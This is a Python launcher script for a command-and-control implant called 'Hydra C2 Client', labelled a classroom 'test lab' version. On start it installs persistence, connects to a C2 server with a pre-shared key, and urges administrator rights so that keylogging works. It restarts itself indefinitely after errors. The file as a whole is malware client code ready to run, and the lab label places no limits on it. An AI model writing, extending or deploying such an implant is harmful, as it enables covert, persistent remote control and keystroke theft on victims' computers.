#!/usr/bin/env python3
"""
Hydra C2 Client - Test Lab Version
This is a specialized version of the Hydra C2 Client designed for classroom environments
"""

import os
import sys
import time
import asyncio
import ctypes
import traceback
import platform

# Add this directory to Python path
current_dir = os.path.dirname(os.path.abspath(__file__))
if current_dir not in sys.path:
    sys.path.insert(0, current_dir)

try:
    # Import client modules
    from hydra_client.network import C2Communication
    from hydra_client.implant import HydraImplant
    from hydra_client.config import SERVER_URL, PSK
    from hydra_client.test_lab import initialize_test_lab, ensure_admin_privileges
except ImportError as e:
    print(f"ERROR: Failed to import required modules: {e}")
    print("Please make sure all dependencies are installed:")
    print("pip install -r requirements.txt")
    sys.exit(1)

def print_banner():
    """Print a banner for the test lab client"""
    print(r"""
 _     _         _           _____  _____ 
| |   | |       | |         / ____|/ ____|
| |__ | |_   _  | |_ ___   | |    | |     
|  _ \| | | | | | __/ _ \  | |    | |     
| | | | | |_| | | || (_) | | |____| |____ 
|_| |_|_|\__, |  \__\___/   \_____|\_____| TEST LAB
          __/ |                          
         |___/                           
""")
    print("Hydra C2 Client - Test Lab Version")
    print("=================================")
    print(f"System: {platform.platform()}")
    print(f"Python: {sys.version.split()[0]}")
    print(f"Server: {SERVER_URL}")
    print()

async def main():
    """Main function for the test lab client"""
    # Initialize test lab environment
    initialize_test_lab()
    
    # Check admin privileges
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print("[!] WARNING: Not running with administrator privileges")
        print("[!] Some features like keylogging may not work properly")
        print("[!] Please restart with administrator privileges for full functionality")
    else:
        print("[+] Running with administrator privileges")
    
    # Initialize C2 communication
    print("[*] Initializing C2 communication...")
    c2 = C2Communication(SERVER_URL, PSK)
    
    # Initialize implant
    print("[*] Initializing implant...")
    implant = HydraImplant()
    
    try:
        # Install persistence
        print("[*] Setting up persistence...")
        if implant.install_persistence():
            print("[+] Persistence installed successfully")
        else:
            print("[-] Failed to install persistence")
        
        # Start C2 communication
        print("[+] Connecting to C2 server...")
        await c2.run()
                
    except KeyboardInterrupt:
        print("[*] Shutting down...")
        await c2.stop()
        sys.exit(0)
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        traceback.print_exc()
        
        # In test lab, try to reconnect after errors
        print("[*] Attempting to reconnect in 10 seconds...")
        await asyncio.sleep(10)
        await c2.stop()
        
        # Recursive call to restart the client
        await main()

def run_lab_client():
    """Entry point for the test lab client"""
    # Print banner
    print_banner()
    
    # Set up asyncio policy for Windows
    if os.name == 'nt':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    
    # Run main loop with better error handling for classroom environment
    while True:
        try:
            asyncio.run(main())
        except KeyboardInterrupt:
            print("\n[*] Exiting...")
            sys.exit(0)
        except Exception as e:
            print(f"\n[-] Fatal error: {e}")
            traceback.print_exc()
            print("\n[*] Restarting client in 10 seconds...")
            time.sleep(10)
            continue

if __name__ == "__main__":
    # Entry point
    run_lab_client() 